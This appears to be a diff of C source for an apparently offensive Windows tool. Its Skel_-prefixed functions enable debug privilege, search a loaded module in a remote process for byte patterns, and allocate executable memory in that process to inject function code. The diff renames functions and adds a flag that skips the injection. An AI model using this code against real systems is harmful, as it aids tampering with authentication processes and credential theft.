@@ -40,7 +40,7 @@ BOOL SetPrivilege(HANDLE hToken, BOOL bEnablePrivilege)
 	return status;
 }
 
-BOOL EnableDebugPrivilege()
+BOOL Skel_EnableDebugPrivilege()
 {
 	HANDLE currentProcessToken = NULL;
 	BOOL status = FALSE;
@@ -123,7 +123,7 @@ BOOL Skel_GetRemoteModuleInformation(DWORD dwPid, LPWSTR mName, PSK_MODULE_INFOR
 
 }
 
-LPVOID Skel_SearchRemotePattern(HANDLE hProcess, PSK_MODULE_INFORMATION pCryptInfo, LPCVOID uPattern, SIZE_T szPattern)
+LPVOID Skel_SearchRemotePatternInLoadedModule(HANDLE hProcess, PSK_MODULE_INFORMATION pCryptInfo, LPCVOID uPattern, SIZE_T szPattern)
 {
 	LPVOID result = 0;
 	MEMORY_BASIC_INFORMATION mInfo = { 0 };
@@ -178,7 +178,7 @@ LPVOID Skel_SearchRemotePattern(HANDLE hProcess, PSK_MODULE_INFORMATION pCryptIn
 
 }
 
-LPVOID Skel_ResolveFakeFunctionPointers(HANDLE hProcess, LPVOID Buffer, DWORD DataSize, PSK_FUNCTION_PTR pskFP, DWORD count) // count: sizeof(skFP) / sizeof(struct_skFP)
+LPVOID Skel_ResolveFakeFunctionPointers(HANDLE hProcess, LPVOID Buffer, DWORD DataSize, PSK_FUNCTION_PTR pskFP, DWORD count, BOOL injectable) // count: sizeof(skFP) / sizeof(struct_skFP)
 {
 	LPVOID RemoteFunctions = 0;
 	HMODULE hModule = 0;
@@ -193,7 +193,7 @@ LPVOID Skel_ResolveFakeFunctionPointers(HANDLE hProcess, LPVOID Buffer, DWORD Da
 			{
 				hModule = LoadLibrary(pskFP[i].Module);
 			}
-			else if (hModule != NULL)
+			if (hModule != NULL)
 			{
 				pskFP[i].Ptr = (PVOID)GetProcAddress(hModule, pskFP[i].Name);
 			}
@@ -215,7 +215,7 @@ LPVOID Skel_ResolveFakeFunctionPointers(HANDLE hProcess, LPVOID Buffer, DWORD Da
 	}
 
 	
-	if (RemoteFunctions == NULL)
+	if ((RemoteFunctions == NULL) && (injectable == TRUE))
 	{
 		RemoteFunctions = VirtualAllocEx(hProcess, 0, DataSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		if (RemoteFunctions != NULL)
@@ -229,7 +229,10 @@ LPVOID Skel_ResolveFakeFunctionPointers(HANDLE hProcess, LPVOID Buffer, DWORD Da
 		else
 			goto error;
 	}
-	
+	else if ((RemoteFunctions == NULL) && (injectable == FALSE))
+	{
+		RemoteFunctions = (LPVOID)1;
+	}
 
 	return RemoteFunctions;
 
